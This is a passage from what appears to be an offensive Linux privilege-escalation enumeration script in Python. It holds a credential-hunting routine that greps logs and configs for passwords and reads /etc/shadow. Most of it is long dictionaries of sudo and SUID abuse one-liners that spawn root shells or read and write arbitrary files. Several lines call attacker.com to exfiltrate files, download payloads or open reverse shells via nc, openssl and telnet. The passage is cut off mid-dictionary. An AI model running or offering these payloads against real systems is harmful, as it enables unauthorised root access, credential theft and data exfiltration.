	else:
		print("\n	No low probability exploit found in ExploitDB.\n")

	sys.stdout.write(RESET)

	return high_chance, low_chance

def vuln_exploitdbkernel(high_chance, low_chance):
	if high_chance == []:
		print("    No high probability kernel exploit found in ExploitDB.\n")
	else:
		print("[!] High Probability Kernel Exploits:")
		for exploit in high_chance:
			print(exploit)

	if low_chance == []:
		print("    No low probability kernel exploit found in ExploitDB.\n")
	else:
		print("[!] Low Probability Kernel Exploits:")
		for exploit in low_chance:
			print(exploit)

# SEARCH FOR PASSWORD IN FILES
def search_passwords():
	password_files = {
		"LOG_PASSWORDS":{"cmd":"find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|passwd' 2>/dev/null", "msg":"Logs Containing Password", "results":results},
		"CONFIG_PASSWORDS":{"cmd":"find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Config Files Containing Password", "results": results},
		"SHADOW":{"cmd":"cat /etc/shadow 2> /dev/null", "msg":"Shadow File (Need Privilege)", "results": results}
	}

	password_files = execute_cmd(password_files)
	print_result(password_files)

# SUDO BINARY DICTIONARY
sudo_bins = {
	"head":
	[
		"LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
	],
	"journalctl":
	[
		"sudo journalctl\n!/bin/sh\n"
	],
	"systemctl":
	[
		"TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
		"TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
		"sudo systemctl\n!sh\n"
	],
	"arp":
	[
		"LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
	],
	"slsh":
	[
		"sudo slsh -e 'system(\"/bin/sh\")'"
	],
	"ash":
	[
		"sudo ash"
	],
	"cupsfilter":
	[
		"LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
	],
	"apt":
	[
		"sudo apt-get changelog apt\n!/bin/sh\n",
		"TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
		"sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
	],
	"cpulimit":
	[
		"sudo cpulimit -l 100 -f /bin/sh"
	],
	"ip":
	[
		"LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
		"sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
	],
	"flock":
	[
		"sudo flock -u / /bin/sh"
	],
	"gcc":
	[
		"sudo gcc -wrapper /bin/sh,-s ."
	],
	"exiftool":
	[
		"LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
	],
	"puppet":
	[
		"sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
	],
	"psql":
	[
		"psql\n\\?\n!/bin/sh\n"
	],
	"find":
	[
		"sudo find . -exec /bin/sh \\; -quit"
	],
	"gdb":
	[
		"sudo gdb -nx -ex '!sh' -ex quit"
	],
	"make":
	[
		"COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
	],
	"diff":
	[
		"LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
	],
	"ksshell":
	[
		"LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
	],
	"ss":
	[
		"LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
	],
	"tftp":
	[
		"RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
	],
	"nice":
	[
		"sudo nice /bin/sh"
	],
	"vim":
	[
		"sudo vim -c ':!/bin/sh'",
		"sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
		"sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
	],
	"pic":
	[
		"sudo pic -U\n.PS\nsh X sh X\n"
	],
	"python":
	[
		"sudo python -c 'import os; os.system(\"/bin/sh\")'"
	],
	"update-alternatives":
	[
		"LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
	],
	"dnf":
	[
		"sudo dnf install -y x-1.0-1.noarch.rpm\n"
	],
	"nmap":
	[
		"TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
		"sudo nmap --interactive\nnmap> !sh\n"
	],
	"more":
	[
		"TERM= sudo more /etc/profile\n!/bin/sh\n"
	],
	"ionice":
	[
		"sudo ionice /bin/sh"
	],
	"emacs":
	[
		"sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
	],
	"socat":
	[
		"sudo socat stdin exec:/bin/sh\n"
	],
	"zip":
	[
		"TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
	],
	"yum":
	[
		"sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
		"TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
	],
	"check_cups":
	[
		"LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
	],
	"rake":
	[
		"sudo rake -p '`/bin/sh 1>&0`'"
	],
	"jq":
	[
		"LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
	],
	"check_statusfile":
	[
		"LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
	],
	"nano":
	[
		"sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
	],
	"uniq":
	[
		"LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
	],
	"cobc":
	[
		"TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
	],
	"ghci":
	[
		"sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
	],
	"split":
	[
		"split --filter=/bin/sh /dev/stdin\n"
	],
	"busybox":
	[
		"sudo busybox sh"
	],
	"pico":
	[
		"sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
	],
	"pry":
	[
		"sudo pry\nsystem(\"/bin/sh\")\n"
	],
	"lwp-request":
	[
		"LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
	],
	"ldconfig":
	[
		"TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
	],
	"pr":
	[
		"LFILE=file_to_read\npr -T $LFILE\n"
	],
	"rpmquery":
	[
		"sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
	],
	# "view":
	# [
	# 	"sudo view -c ':!/bin/sh'",
	# 	"sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	# 	"sudo view -c ':lua os.execute(\"reset; exec sh\")'"
	# ],
	"tbl":
	[
		"LFILE=file_to_read\nsudo tbl $LFILE\n"
	],
	"nl":
	[
		"LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
	],
	# "rview":
	# [
	# 	"sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	# 	"sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
	# ],
	# "tcpdump":
	# [
	# 	"COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
	# ],
	"file":
	[
		"LFILE=file_to_read\nsudo file -f $LFILE\n"
	],
	"dig":
	[
		"LFILE=file_to_read\nsudo dig -f $LFILE\n"
	],
	"gawk":
	[
		"sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
	],
	"xargs":
	[
		"sudo xargs -a /dev/null sh"
	],
	"expand":
	[
		"LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
	],
	"nsenter":
	[
		"sudo nsenter /bin/sh"
	],
	"strings":
	[
		"LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
	],
	"restic":
	[
		"RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
	],
	"xxd":
	[
		"LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
	],
	"cowthink":
	[
		"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
	],
	"eqn":
	[
		"LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
	],
	"byebug":
	[
		"TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
	],
	"ksh":
	[
		"sudo ksh"
	],
	"scp":
	[
		"TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
	],
	"ld.so":
	[
		"sudo /lib/ld.so /bin/sh"
	],
	"check_raid":
	[
		"LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
	],
	"ftp":
	[
		"sudo ftp\n!/bin/sh\n"
	],
	"date":
	[
		"LFILE=file_to_read\nsudo date -f $LFILE\n"
	],
	"tac":
	[
		"LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
	],
	"wget":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE\n"
	],
	"run-mailcap":
	[
		"sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
	],
	"start-stop-daemon":
	[
		"sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
	],
	"mysql":
	[
		"sudo mysql -e '\\! /bin/sh'"
	],
	"check_ssl_cert":
	[
		"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
	],
	"column":
	[
		"LFILE=file_to_read\nsudo column $LFILE\n"
	],
	"pkexec":
	[
		"sudo pkexec /bin/sh"
	],
	"nc":
	[
		"RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
	],
	"gtester":
	[
		"TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
	],
	"fold":
	[
		"LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
	],
	"less":
	[
		"sudo less /etc/profile\n!/bin/sh\n"
	],
	"jrunscript":
	[
		"sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
	],
	"run-parts":
	[
		"sudo run-parts --new-session --regex '^sh$' /bin"
	],
	"rvim":
	[
		"sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
		"sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
	],
	"uudecode":
	[
		"LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
	],
	"ssh":
	[
		"sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
	],
	"sftp":
	[
		"HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
	],
	"sysctl":
	[
		"LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\"\n"
	],
	"pip":
	[
		"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
	],
	"node":
	[
		"sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
	],
	"php":
	[
		"CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
	],
	"watch":
	[
		"sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
	],
	"rpm":
	[
		"sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
		"sudo rpm -ivh x-1.0-1.noarch.rpm\n"
	],
	"install":
	[
		"LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
	],
	"rlwrap":
	[
		"sudo rlwrap /bin/sh"
	],
	"basenc":
	[
		"LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
	],
	"mount":
	[
		"sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
	],
	"highlight":
	[
		"LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
	],
	"dmsetup":
	[
		"sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
	],
	"xz":
	[
		"LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
	],
	"ex":
	[
		"sudo ex\n!/bin/sh\n"
	],
	"stdbuf":
	[
		"sudo stdbuf -i0 /bin/sh"
	],
	"hexdump":
	[
		"LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
	],
	"ed":
	[
		"sudo ed\n!/bin/sh\n"
	],
	"paste":
	[
		"LFILE=file_to_read\nsudo paste $LFILE\n"
	],
	# "script":
	# [
	# 	"sudo script -q /dev/null"
	# ],
	"check_log":
	[
		"LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
	],
	"base32":
	[
		"LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
	],
	"gem":
	[
		"sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
	],
	"jjs":
	[
		"echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
	],
	"setarch":
	[
		"sudo setarch $(arch) /bin/sh"
	],
	"dd":
	[
		"LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
	],
	"sqlite3":
	[
		"sudo sqlite3 /dev/null '.shell /bin/sh'"
	],
	"ltrace":
	[
		"sudo ltrace -b -L /bin/sh"
	],
	"bpftrace":
	[
		"sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
		"TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
		"sudo bpftrace -c /bin/sh -e 'END {exit()}'"
	],
	"dmesg":
	[
		"sudo dmesg -H\n!/bin/sh\n"
	],
	"crash":
	[
		"sudo crash -h\n!sh\n"
	],
	"easy_install":
	[
		"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
	],
	"env":
	[
		"sudo env /bin/sh"
	],
	"base64":
	[
		"LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"
	],
	"zypper":
	[
		"sudo zypper x\n",
		"TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
	],
	"curl":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
	],
	"hd":
	[
		"LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
	],
	"nroff":
	[
		"TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
	],
	"pg":
	[
		"sudo pg /etc/profile\n!/bin/sh\n"
	],
	"zsoelim":
	[
		"LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
	],
	"cowsay":
	[
		"TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
	],
	"dialog":
	[
		"LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
	],
	"uuencode":
	[
		"LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
	],
	"comm":
	[
		"LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
	],
	"chmod":
	[
		"LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
	],
	"mawk":
	[
		"sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
	],
	"rev":
	[
		"LFILE=file_to_read\nsudo rev $LFILE | rev\n"
	],
	# "wish":
	# [
	# 	"sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
	# ],
	"nohup":
	[
		"sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
	],
	"telnet":
	[
		"RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
	],
	"od":
	[
		"LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
	],
	"time":
	[
		"sudo /usr/bin/time /bin/sh"
	],
	"bundler":
	[
		"sudo bundler help\n!/bin/sh\n"
	],
	"rsync":
	[
		"sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
	],
	"mail":
	[
		"sudo mail --exec='!/bin/sh'"
	],
	"logsave":
	[
		"sudo logsave /dev/null /bin/sh -i"
	],
	"screen":
	[
		"sudo screen"
	],
	"lua":
	[
		"sudo lua -e 'os.execute(\"/bin/sh\")'"
	],
	"busctl":
	[
		"sudo busctl --show-machine\n!/bin/sh\n"
	],
	"csplit":
	[
		"LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
	],
	"tee":
	[
		"LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
	],
	"iftop":
	[
		"sudo iftop\n!/bin/sh\n"
	],
	"eb":
	[
		"sudo eb logs\n!/bin/sh\n"
	],
	"troff":
	[
		"LFILE=file_to_read\nsudo troff $LFILE\n"
	],
	"git":
	[
		"sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
		"sudo git -p help config\n!/bin/sh\n",
		"sudo git branch --help config\n!/bin/sh\n",
		"TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
		"TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
	],
	"fmt":
	[
		"LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
	],
	"tail":
	[
		"LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
	],
	"expect":
	[
		"sudo expect -c 'spawn /bin/sh;interact'"
	],
	"openssl":
	[
		"RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
	],
	"unexpand":
	[
		"LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
	],
	"smbclient":
	[
		"sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
	],
	"service":
	[
		"sudo service ../../bin/sh"
	],
	# "check_by_ssh":
	# [
	# 	"sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
	# ],
	"dpkg":
	[
		"sudo dpkg -l\n!/bin/sh\n",
		"sudo dpkg -i x_1.0_all.deb"
	],
	"iconv":
	[
		"LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
	],
	"grep":
	[
		"LFILE=file_to_read\nsudo grep '' $LFILE\n"
	],
	"hping3":
	[
		"sudo hping3\n/bin/sh\n"
	],
	"irb":
	[
		"sudo irb\nexec '/bin/bash'\n"
	],
	"apt-get":
	[
		"sudo apt-get changelog apt\n!/bin/sh\n",
		"TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
		"sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
	],
	"cpan":
	[
		"sudo cpan\n! exec '/bin/bash'\n"
	],
	"strace":
	[
		"sudo strace -o /dev/null /bin/sh"
	],
	"redcarpet":
	[
		"LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
	],
	"ruby":
	[
		"sudo ruby -e 'exec \"/bin/sh\"'"
	],
	"csh":
	[
		"sudo csh"
	],
	"ul":
	[
		"LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
	],
	"genisoimage":
	[
		"LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
	],
	"facter":
	[
		"TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
	],
	"timeout":
	[
		"sudo timeout --foreground 7d /bin/sh"
	],
	"taskset":
	[
		"sudo taskset 1 /bin/sh"
	],
	"ssh-keyscan":
	[
		"LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
	],
	"nawk":
	[
		"sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
	],
	"pdb":
	[
		"TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
	],
	"red":
	[
		"sudo red file_to_write\na\nDATA\n.\nw\nq\n"
	],
	"ghc":
	[
		"sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
	],
	"capsh":
	[
		"sudo capsh --"
	],
	"docker":
	[
		"sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
	],
	"tclsh":
	[
		"sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
	],
	"dash":
	[
		"sudo dash"
	],
	"zsh":
	[
		"sudo zsh"
	],
	"join":
	[
		"LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
	],
	"at":
	[
		"echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
	],
	"su":
	[
		"sudo su"
	],
	"top":
	[
		"echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
	],
	"awk":
	[
		"sudo awk 'BEGIN {system(\"/bin/sh\")}'"
	],
	"cp":
	[
		"LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
		"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"
	],
	"gimp":
	[
		"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
	],
	"chroot":
	[
		"sudo chroot /\n"
	],
	"xmodmap":
	[
		"LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
	],
	"perl":
	[
		"sudo perl -e 'exec \"/bin/sh\";'"
	],
	"mtr":
	[
		"LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
	],
	"sort":
	[
		"LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
	],
	"man":
	[
		"sudo man man\n!/bin/sh\n"
	],
	"cat":
	[
		"LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
	],
	"tar":
	[
		"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
	],
	"aria2c":
	[
		"COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
	],
	"shuf":
	[
		"LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
	],
	"sed":
	[
		"sudo sed -n '1e exec sh 1>&0' /etc/hosts"
	],
	"composer":
	[
		"TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
	],
	"check_memory":
	[
		"LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
	],
	"soelim":
	[
		"LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
	],
	"look":
	[
		"LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
	],
	"tmux":
	[
		"sudo tmux"
	],
	"bash":
	[
		"sudo bash"
	],
	"chown":
	[
		"LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
	],
	"unshare":
	[
		"sudo unshare /bin/sh"
	],
	"readelf":
	[
		"LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
	],
	"cut":
	[
		"LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
	],
	"mv":
	[
		"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
	],
	# "vi":
	# [
	# 	"sudo vi -c ':!/bin/sh' /dev/null"
	# ],
	"valgrind":
	[
		"sudo valgrind /bin/sh"
	],
	"lwp-download":
	[
		"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
	],
	"crontab":
	[
		"sudo crontab -e"
	]
}

suid_bins = {
	"head":
	[
		"LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
	],
	"systemctl":
	[
		"TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
	],
	"arp":
	[
		"LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
	],
	"ash":
	[
		"./ash"
	],
	"cupsfilter":
	[
		"LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
	],
	"ip":
	[
		"LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
		"./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
	],
	"flock":
	[
		"./flock -u / /bin/sh -p"
	],
	"find":
	[
		"./find . -exec /bin/sh -p \\; -quit"
	],
	"gdb":
	[
		"./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
	],
	"make":
	[
		"COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
	],
	"diff":
	[
		"LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
	],
	"ksshell":
	[
		"LFILE=file_to_read\n./ksshell -i $LFILE\n"
	],
	"ss":
	[
		"LFILE=file_to_read\n./ss -a -F $LFILE\n"
	],
	"tftp":
	[
		"RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
	],
	"nice":
	[
		"./nice /bin/sh -p"
	],
	"vim":
	[
		"./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
	],
	"python":
	[
		"./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
	],
	"update-alternatives":
	[
		"LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
	],
	"nmap":
	[
		"LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
	],
	"more":
	[
		"./more file_to_read"
	],
	"ionice":
	[
		"./ionice /bin/sh -p"
	],
	"emacs":
	[
		"./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
	],
	"jq":
	[
		"LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
	],
	"uniq":
	[
		"LFILE=file_to_read\n./uniq \"$LFILE\"\n"
	],
	"busybox":
	[
		"./busybox sh"
	],
	"lwp-request":
	[
		"LFILE=file_to_read\n./lwp-request \"file://$LFILE\"\n"
	],
	"pr":
	[
		"LFILE=file_to_read\npr -T $LFILE\n"
	],
	"view":
	[
		"./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
	],
	"tbl":
	[
		"LFILE=file_to_read\n./tbl $LFILE\n"
	],
	"nl":
	[
		"LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
	],
	"rview":
	[
		"./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
	],
	"file":
	[
		"LFILE=file_to_read\n./file -f $LFILE\n"
	],
	"dig":
	[
		"LFILE=file_to_read\n./dig -f $LFILE\n"
	],
	"xargs":
	[
		"./xargs -a /dev/null sh -p"
	],
	"expand":
	[
		"LFILE=file_to_read\n./expand \"$LFILE\"\n"
	],
	"strings":
	[
		"LFILE=file_to_read\n./strings \"$LFILE\"\n"
	],
	"restic":
	[
		"RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
	],
	"xxd":
	[
